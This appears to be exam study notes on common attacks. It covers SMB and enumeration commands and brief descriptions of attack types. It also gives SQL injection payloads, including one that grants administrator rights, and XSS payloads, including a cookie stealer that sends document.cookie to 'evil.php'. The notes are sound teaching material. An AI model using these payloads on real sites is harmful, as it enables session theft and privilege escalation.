# Common Attacks

## Exam Outcome

Demonstrate a broad knowledge of computer and network attacks

## Common Attacks

## 1. Recon

## 2. Scanning

### SMB Sessions

View SMB sessions (outbound)

```
net use
```

View SMB sessions (inbound):

```
net session
```

Establishing an SMB session:

```
net use \\%COMPUTERNAME% /u:[account]
```

Delete an SMB session:

```
net use \\%COMPUTERNAME% /del
```

Using the enum tool to pull user, password policy, and grup info:

```
enum -u [user] -p [password] -U [target IP]
enum -u [user] -p [password] -P [target IP]
enum -u [user] -p [password] -G [target IP]
```

### War Dialing

Dialing a sequence of telephone numbers attempting to locate a modem. Popular tool for doing so is HD Moore's WarVOX.

### War Driving

The act of performing wireless LAN discovery.

## 2.  Exploitation

Exploitation (per 504) is broken down into 3 sections:

Gaining Access
Web App Attacks
Denial of Service

### IP Address Spoofing

### Passsive and Active Sniffing

### Session Hijacking with Ettercap

Session hijacking synthesizes sniffing and spoofing.

### DNS Cache Poisoning

### Buffer Overflows

Allows an attacker to execute arbitrary commands on your machine.

### Format String Attacks

Related to manipulating programs that misuse printf and related commands to read arbitrary information from memory.



















Source: 401.2, pg. 214

- Malicious Code
- Remote Maintenance
- Denial of Service
- Brute Force
- Browsing
- Race Conditions
- Alteration of Code
- Rootkits

### Smurf Attack (Using Broadcast Address)

Source: 401.1, pg. 77

Sends spoofed ICMP echo requests (also known as "ping") to a network's broadcast address. The spoofed machine gets many, many responses, consuming most or all of its bandwidth.

### SQL Injection

SQL Injection is the most common webbased attack. It is use when the hacker places commands which can trigger valid SQL queries within a field not typically associated with SQL commands. Fields like "Username" and "Password". But these types of command be inserted into any DB style entry field.

1. List Field Values #1:
An attacker may try the following to see if they can get a list of values from a particular field, user, pass, version, email, etc.
```
'0 OR 1=1'
```

Equivalent to the SQL Command:
'SELECT * FROM Users WHERE UserId = 0 OR 1=1;''

2. List Field Values #2:
An attacker may try the following to get a list of values from a particular field, user, pass, version, email, etc.
```
" or ""="
```

Equivalent to the SQL Command:
SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""=""

3. Elevate privileges
```
"john'; INSERT INTO group_membership (user_id, group) VALUES (SELECT user_id FROM users WHERE username='john', 'Administrator'); --'"
```

Equivalent to the SQL Command:
SELECT user_id, username, password_hash FROM users WHERE username = 'john'; 
INSERT INTO group_membership (user_id, group) VALUES (SELECT user_id FROM users WHERE username='john', 'Administrator'); --'

### XSS Attacks

1. Black Box Testing

Enter the following in the url:

```
hxxp://www.site.com/index.php?name=<script>alert(123)</script>
```

2. Search Test
If the site has a serach field without proper sanitization:
```
hxxp://www.site.com/search?source=“><script>alert(123)</script>
```

3. One Error Test
If the site has a mouseover or onerror capability
```
hxxp://www.site.com/index.php?name=<b onmouseover=alert('Wufff!')>click me!</b>
```
```
hxxp://www.site.com/index.php?name=<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
```

4. Cookie Stealer
```
hxxp://www.site.com/index.php?name=<SCRIPT type="text/javascript"> var adr = '../evil.php?cakemonster=' + escape(document.cookie);</SCRIPT>
```

5. Hide from javascript
```
hxxp://www.site.com/index.php?name=<IMG SRC=j&#X41vascript:alert(123)>
```
